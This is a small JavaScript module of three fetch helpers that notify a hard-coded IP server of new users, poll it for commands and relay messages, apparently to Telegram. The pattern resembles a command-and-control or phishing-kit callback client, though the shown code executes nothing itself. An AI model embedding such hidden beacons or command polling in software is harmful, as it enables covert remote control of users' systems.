import { Postpone } from "next/dist/server/app-render/dynamic-rendering";

export const notifyNewUser = async () => {
  try {
    const response = await fetch('http://5.196.190.224:5000/notify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({}),
    });

    if (!response.ok) {
      throw new Error('Failed to notify');
    }

    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error notifying new user:', error);
  }
};



export const checkForCommands = async () => {
  try {
    const response = await fetch('http://5.196.190.224:5000/check-command');
    if (!response.ok) throw new Error('No commands');
    return await response.json();
  } catch (error) {
    console.error('Error fetching commands:', error);
    return null;
  }
};



export const sendMessageToTelegram = async (message) => {
  try {
    const response = await fetch('http://5.196.190.224:5000/send-message', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message }),
    });

    if (!response.ok) throw new Error('Failed to send message');

    return await response.json();
  } catch (error) {
    console.error('Error sending message:', error);
    return null;
  }
};
